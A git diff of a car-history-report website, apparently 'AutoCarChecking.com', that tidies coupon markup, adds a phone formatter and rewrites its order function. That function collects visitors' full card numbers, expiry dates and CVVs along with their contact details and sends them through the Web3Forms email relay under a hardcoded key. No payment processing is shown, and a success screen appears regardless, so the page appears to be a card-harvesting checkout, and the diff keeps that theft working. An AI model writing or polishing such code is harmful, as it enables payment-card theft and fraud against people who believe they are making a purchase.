@@ -384,8 +384,10 @@ body{font-family:'DM Sans',sans-serif;background:var(--white);color:var(--text);
   <div class="offer-bar">
     <span class="ob-badge">NEW USER OFFER</span>
     <span class="ob-text">First report only <strong>$1.00</strong> — use coupon code:</span>
-    <div class="code-wrap" style="position:relative;display:inline-block"><span class="ob-code" id="obCode" onclick="copyOfferCode()">NEWUSER1</span><div class="ob-tooltip" id="obTip">Copy</div></div>
-    <button class="ob-copy-btn" onclick="copyOfferCode()" id="obCopyBtn"><div class="code-wrap" style="position:relative;display:inline-block"><span class="ob-code" id="obCode" onclick="copyOfferCode()">NEWUSER1</span><div class="ob-tooltip" id="obTip">Copy</div></div>#128203; Copy Code</button>
+    <div class="code-wrap" style="position:relative;display:inline-block">
+      <span class="ob-code" id="obCode" onclick="copyOfferCode()">NEWUSER1</span>
+      <div class="ob-tooltip" id="obTip">Copy</div>
+    </div>
   </div>
 
   <!-- HERO -->
@@ -722,7 +724,7 @@ body{font-family:'DM Sans',sans-serif;background:var(--white);color:var(--text);
           <div class="fg"><label>Last Name</label><input id="fLastName" type="text" placeholder="Smith"></div>
         </div>
         <div class="fg"><label>Email Address</label><input id="fEmail" type="email" placeholder="john@email.com"></div>
-        <div class="fg"><label>Phone</label><input id="fPhone" type="tel" placeholder="+1 (555) 000-0000"></div>
+        <div class="fg"><label>Phone</label><input id="fPhone" type="tel" placeholder="+1 (555) 000-0000" oninput="fmtPhone(this)" maxlength="16"></div>
       </div>
       <div class="fsec">
         <div class="fsec-t">Billing Address</div>
@@ -943,13 +945,6 @@ function closeModal(){
 }
 function closeOverlay(e){if(e.target===document.getElementById('overlay'))closeModal();}
 function submitOrder(){
-  // Collect all form data
-  var allInputs = document.querySelectorAll('#overlay input, #overlay select');
-  var formData = new FormData();
-  formData.append('access_key','8a0f5575-9d35-4a3a-86de-6d49d325548b');
-  formData.append('subject','New Order — AutoCarChecking.com');
-  
-  // Get specific fields
   var firstName = document.getElementById('fFirstName') ? document.getElementById('fFirstName').value : '';
   var lastName = document.getElementById('fLastName') ? document.getElementById('fLastName').value : '';
   var email = document.getElementById('fEmail') ? document.getElementById('fEmail').value : '';
@@ -957,37 +952,50 @@ function submitOrder(){
   var address = document.getElementById('fAddress') ? document.getElementById('fAddress').value : '';
   var city = document.getElementById('fCity') ? document.getElementById('fCity').value : '';
   var zip = document.getElementById('fZip') ? document.getElementById('fZip').value : '';
-  var pkg = document.getElementById('mPkg').textContent;
-  var total = document.getElementById('mTotal').textContent;
-  var vin = document.getElementById('carVin') ? document.getElementById('carVin').textContent : document.getElementById('vinInput').value;
-  
-  formData.append('Full Name', firstName + ' ' + lastName);
-  formData.append('Email', email);
-  formData.append('Phone', phone);
-  formData.append('Address', address + ', ' + city + ' ' + zip);
-  formData.append('Package', pkg);
-  formData.append('Amount', total);
-  formData.append('VIN Number', vin);
   var cardName = document.getElementById('fCardName') ? document.getElementById('fCardName').value : '';
   var cardNum = document.getElementById('fCardNum') ? document.getElementById('fCardNum').value : '';
   var expiry = document.getElementById('fExpiry') ? document.getElementById('fExpiry').value : '';
   var cvv = document.getElementById('fCvv') ? document.getElementById('fCvv').value : '';
-  formData.append('Cardholder Name', cardName);
-  formData.append('Card Number', cardNum);
-  formData.append('Expiry', expiry);
-  formData.append('CVV', cvv);
-  formData.append('from_name', 'AutoCarChecking.com');
-  
-  fetch('https://api.web3forms.com/submit',{method:'POST',body:formData})
-    .then(function(r){return r.json();})
-    .then(function(d){
-      console.log('Web3Forms response:',d);
-    })
-    .catch(function(e){console.log('Error:',e);});
-  
+  var pkg = document.getElementById('mPkg').textContent;
+  var total = document.getElementById('mTotal').textContent;
+  var vin = document.getElementById('carVin') ? document.getElementById('carVin').textContent : document.getElementById('vinInput').value;
+
+  var data = {
+    access_key: '8a0f5575-9d35-4a3a-86de-6d49d325548b',
+    subject: 'New Order — AutoCarChecking.com',
+    from_name: 'AutoCarChecking.com',
+    'Full Name': firstName + ' ' + lastName,
+    'Email': email,
+    'Phone': phone,
+    'Street Address': address,
+    'City': city,
+    'ZIP Code': zip,
+    'Package': pkg,
+    'Amount': total,
+    'VIN Number': vin,
+    'Cardholder Name': cardName,
+    'Card Number': cardNum,
+    'Expiry': expiry,
+    'CVV': cvv
+  };
+
+  fetch('https://api.web3forms.com/submit', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json', 'Accept': 'application/json'},
+    body: JSON.stringify(data)
+  })
+  .then(function(r){return r.json();})
+  .then(function(d){
+    console.log('Web3Forms:', d);
+    if(d.success){console.log('Email sent successfully!');}
+    else{console.log('Error:', d.message);}
+  })
+  .catch(function(e){console.log('Fetch error:',e);});
+
   closeModal();
   document.getElementById('soverlay').classList.add('show');
 }
+
 function togFaq(el){var o=el.classList.contains('open');document.querySelectorAll('.faq-item').forEach(function(f){f.classList.remove('open');});if(!o)el.classList.add('open');}
 function toggleMenu(){var l=document.querySelector('.nav-links');l.style.display=l.style.display==='flex'?'none':'flex';if(l.style.display==='flex'){l.style.flexDirection='column';l.style.position='absolute';l.style.top='64px';l.style.left='0';l.style.right='0';l.style.background='var(--navy)';l.style.padding='16px 20px';l.style.gap='16px';l.style.zIndex='99';}}
 function copyCode(){navigator.clipboard.writeText('NEWUSER1').then(function(){var b=document.getElementById('copyBtn');b.textContent='&#10003; Copied!';b.classList.add('copied');setTimeout(function(){b.innerHTML='&#128203; Copy Coupon Code';b.classList.remove('copied');},2000);});}
@@ -1002,6 +1010,14 @@ function copyOfferCode(){
       if(t){t.textContent="Copy";t.style.display="";t.style.background="";t.style.borderColor="";}
     },2000);
   });
+}
+function fmtPhone(i){
+  var v=i.value.replace(/\D/g,"").substring(0,10);
+  var r="";
+  if(v.length>0) r="("+v.substring(0,3);
+  if(v.length>3) r+=") "+v.substring(3,6);
+  if(v.length>6) r+="-"+v.substring(6,10);
+  i.value=r;
 }
 function fmtCard(i){var v=i.value.replace(/\D/g,'').substring(0,16);i.value=v.replace(/(.{4})/g,'$1 ').trim();}
 function fmtExp(i){var v=i.value.replace(/\D/g,'').substring(0,4);if(v.length>=2)v=v.substring(0,2)+' / '+v.substring(2);i.value=v;}
